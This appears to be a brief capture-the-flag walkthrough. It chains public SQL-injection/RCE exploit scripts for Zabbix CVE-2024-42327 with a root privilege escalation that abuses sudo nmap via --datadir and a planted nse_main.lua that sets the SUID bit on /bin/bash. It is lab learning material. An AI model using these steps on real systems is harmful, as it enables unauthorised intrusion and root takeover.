then exploit sqli cve: 
https://github.com/compr00t/CVE-2024-42327/blob/main/cve-2024-42327.py
https://github.com/BridgerAlderson/Zabbix-CVE-2024-42327-SQL-Injection-RCE/blob/main/exploit.py

to get admin session and then you can RCE with that

the first github url sqli works fine and we get admin session but the second one with RCE doesnt work and needs a little fixing in getting admin session so we can merge the two

after getting the shell and user flag, you immediately see that you can use nmap with sudo perms.

GTFObins isnt useful since nmap has some options blocked so i looked for other options and saw --datadir that lets you customize the folder from which scripts are read and executed so asking chatgpt, i discovered that some default options execute certain scripts like:

changing `nmap-mac-prefixes` and executing `sudo nmap -O 127.0.0.1`
changing `nmap-services` and executing  `sudo nmap -p 9999 127.0.0.1`
changing `nmap-payloads` and executing  `sudo nmap -p 135 127.0.0.1`
changing `nse_main.lua`	and executing  `sudo nmap -sV 127.0.0.1`
changing `nse_main.lua`	and executing  `sudo nmap -sV 127.0.0.1`

so i created /tmp/nse_main.lua containing 'os.execute("chmod +s /bin/bash")' then execute: sudo /usr/bin/nmap --datadir=/tmp -sV -sC localhost

and after its done you can just:

/bin/bash -p
